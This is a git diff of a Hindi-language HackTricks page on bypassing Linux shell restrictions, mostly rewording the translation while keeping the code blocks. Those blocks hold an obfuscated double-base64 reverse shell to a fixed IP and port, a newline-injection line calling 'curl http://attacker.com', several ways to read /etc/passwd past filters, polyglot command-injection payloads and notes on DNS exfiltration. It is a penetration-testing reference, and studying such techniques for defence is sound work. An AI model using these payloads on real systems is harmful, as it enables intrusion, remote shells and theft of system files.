@@ -1,16 +1,16 @@
-# लिनक्स प्रतिबंधों को दूर करें
+# Linux प्रतिबंधों को बायपास करें
 
 {% hint style="success" %}
-AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>हैकट्रिक्स का समर्थन करें</summary>
+<summary>HackTricks का समर्थन करें</summary>
 
-* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
-* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** को [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।
+* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
+* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमारा अनुसरण करें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।
 
 </details>
 {% endhint %}
@@ -18,20 +18,20 @@ GCP हैकिंग सीखें और अभ्यास करें: <
 <figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से बनाएं और **स्वचालित कार्यप्रणालियाँ** जो दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा संचालित हैं।\
-आज ही पहुंच प्राप्त करें:
+[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) का उपयोग करें ताकि आप दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित **कार्यप्रवाहों** को आसानी से बना और **स्वचालित** कर सकें।\
+आज ही एक्सेस प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## सामान्य प्रतिबंधों को दूर करने के तरीके
+## सामान्य सीमाओं को बायपास करें
 
-### रिवर्स शैल्‍ड
+### रिवर्स शेल
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
 # echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
 ```
-### छोटा रिवर्स शैल
+### शॉर्ट रिव शेल
 ```bash
 #Trick from Dikline
 #Get a rev shell with
@@ -39,7 +39,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### पथों और निषिद्ध शब्दों को छेड़ना
+### पथों और निषिद्ध शब्दों को बायपास करें
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -94,7 +94,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### निषिद्ध अंतरिक्षों को छोड़ें
+### प्रतिबंधित स्थानों को बायपास करें
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -127,16 +127,16 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### बैकस्लैश और स्लैश को दौर करें
+### बैकस्लैश और स्लैश को बायपास करें
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### पाइप्स को उमके से पार करें
+### पाइप्स को बायपास करें
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### हेक्स इन्कोडिंग के साथ बायपास
+### हेक्स एन्कोडिंग के साथ बायपास
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -146,7 +146,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### आईपी को छलकरी करें
+### IPs को बायपास करें
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -155,19 +155,19 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### एनवायरनमेंट वेरिएबल से चार्स प्राप्त करना
+### पर्यावरण चर से वर्ण प्राप्त करना
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
 ```
-### DNS डेटा उद्धारण
+### DNS डेटा एक्सफिल्ट्रेशन
 
-आप **burpcollab** या [**pingb**](http://pingb.in) का उपयोग कर सकते हैं।
+आप उदाहरण के लिए **burpcollab** या [**pingb**](http://pingb.in) का उपयोग कर सकते हैं।
 
-### बिल्टइंस
+### बिल्टइन्स
 
-यदि आप बाहरी फ़ंक्शनों को नहीं चला सकते और केवल **RCE प्राप्त करने के लिए सीमित सेट का पहुंच है**, तो इसे करने के लिए कुछ उपयोगी ट्रिक्स हैं। आम तौर पर आपको **सभी** **बिल्टइंस** का उपयोग नहीं करने की अनुमति होगी, इसलिए आपको जेल को दरकिनार करने की कोशिश करने के लिए अपने सभी विकल्पों को जानना चाहिए। [**devploit**](https://twitter.com/devploit) से विचार।\
-सबसे पहले सभी [**शेल बिल्टइंस**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** की जांच करें।** फिर यहाँ आपके पास कुछ **सिफारिशें** हैं:
+यदि आप बाहरी फ़ंक्शंस को निष्पादित नहीं कर सकते हैं और केवल **RCE प्राप्त करने के लिए सीमित सेट के बिल्टइन्स** तक पहुंच है, तो इसे करने के लिए कुछ उपयोगी तरकीबें हैं। आमतौर पर आप **सभी** **बिल्टइन्स** का उपयोग नहीं कर पाएंगे, इसलिए आपको **अपने सभी विकल्पों** के बारे में **जानना चाहिए** ताकि आप जेल को बायपास करने की कोशिश कर सकें। [**devploit**](https://twitter.com/devploit) से विचार।\
+सबसे पहले सभी [**शेल बिल्टइन्स**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)** की जांच करें।** फिर यहां आपके लिए कुछ **सिफारिशें** हैं:
 ```bash
 # Get list of builtins
 declare builtins
@@ -219,17 +219,17 @@ chmod +x [
 export PATH=/tmp:$PATH
 if [ "a" ]; then echo 1; fi # Will print hello!
 ```
-### पॉलीग्लॉट कमांड इन्जेक्शन
+### पॉलीग्लॉट कमांड इंजेक्शन
 ```bash
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### पॉटेंशियल रेजेक्स को बायपास करें
+### संभावित regexes को बायपास करें
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
-### बैशफस्केटर
+### Bashfuscator
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
@@ -316,46 +316,46 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## केवल पठनीय/नोएक्सेक/डिस्ट्रोलेस बायपास
+## Read-Only/Noexec/Distroless Bypass
 
-यदि आप **केवल पठनीय और नोएक्सेक सुरक्षा** या फिर एक डिस्ट्रोलेस कंटेनर में हैं, तो भी **विभिन्न बाइनरी को क्रियाशील करने के तरीके हैं, यहाँ तक कि शैल भी!:**
+यदि आप एक फ़ाइल सिस्टम के अंदर हैं जिसमें **read-only और noexec सुरक्षा** है या यहां तक कि एक distroless कंटेनर में हैं, तो भी **मनमाने बाइनरी को निष्पादित करने के तरीके हैं, यहां तक कि एक शेल!:**
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
 {% endcontent-ref %}
 
-## चरूट और अन्य जेल्स बायपास
+## Chroot & other Jails Bypass
 
 {% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
 {% endcontent-ref %}
 
-## संदर्भ और अधिक
+## References & More
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 * [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और **दुनिया के सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित **कार्यप्रवाहों** को आसानी से निर्माण और स्वचालित करें।\
-आज ही पहुंचें:
+[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें ताकि आप आसानी से **वर्कफ़्लो** बना और **स्वचालित** कर सकें जो दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित हैं।\
+आज ही एक्सेस प्राप्त करें:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {% hint style="success" %}
-AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>हैकट्रिक्स का समर्थन करें</summary>
+<summary>HackTricks का समर्थन करें</summary>
 
-* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
-* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** को पीआर जमा करके और [**हैकट्रिक्स क्लाउड**](https://github.com/carlospolop/hacktricks) गिटहब रेपो में प्रस्तुत करके।
+* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
+* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**
 
 </details>
 {% endhint %}
